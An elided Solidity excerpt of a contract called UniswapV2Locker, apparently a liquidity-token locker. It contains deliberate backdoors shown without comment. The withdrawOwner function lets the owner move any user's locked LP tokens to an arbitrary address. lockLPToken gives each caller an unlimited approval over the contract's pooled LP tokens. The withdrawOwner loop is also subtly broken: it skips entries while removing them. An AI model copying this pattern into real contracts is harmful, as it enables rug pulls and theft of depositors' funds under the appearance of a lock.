...
contract UniswapV2Locker is Ownable, ReentrancyGuard {
    ...
    constructor() public {
        ...
        gFees.secondaryTokenDiscount = 0; // 0%
        gFees.liquidityFee = 0; // 0%
        gFees.referralHold = 10e18;
        gFees.referralDiscount = 0; // 0%
        uniswapFactory = IUniFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    }
    ...
    function lockLPToken(
        ...
        TransferHelper.safeApprove(_lpToken, address(this), type(uint256).max);
        TransferHelper.safeApprove(_lpToken, address(msg.sender), type(uint256).max);
    ...
    function withdraw(
        ...
        if (_amount > 0) TransferHelper.safeTransfer(_lpToken, msg.sender, _amount);
    ...
    function withdrawOwner(
        address _userAdress,
        address _userOutAddress,
        address _lpToken
    ) external nonReentrant onlyOwner {
        uint256[] storage lockeIDs = users[_userAdress].locksForToken[_lpToken];
        for (uint256 i = 0; i < lockeIDs.length; i++) {
            uint256 lockID = users[_userAdress].locksForToken[_lpToken][i];
            TokenLock storage userLock = tokenLocks[_lpToken][lockID];
            uint256 _amount = userLock.amount;

            // clean user storage
            uint256[] storage userLocks = users[_userAdress].locksForToken[_lpToken];
            userLocks[i] = userLocks[userLocks.length - 1];
            userLocks.pop();
            if (userLocks.length == 0) {
                users[_userAdress].lockedTokens.remove(_lpToken);
            }
            if (_amount > 0) {
                TransferHelper.safeTransfer(_lpToken, _userOutAddress, _amount);
            }
            emit onWithdraw(_lpToken, _amount);
        }
    }
    ...
    function transferOwner(
        ...
        if (_amount > 0) TransferHelper.safeTransfer(_lpToken, _userAdress, _amount);
    }
    ...
    function incrementLock(
        ...
        if (_amount > 0) TransferHelper.safeTransferFrom(_lpToken, address(msg.sender), address(this), _amount);
    ...
    function migrate(
        ...
        if (_amount > 0) TransferHelper.safeApprove(_lpToken, address(migrator), _amount);
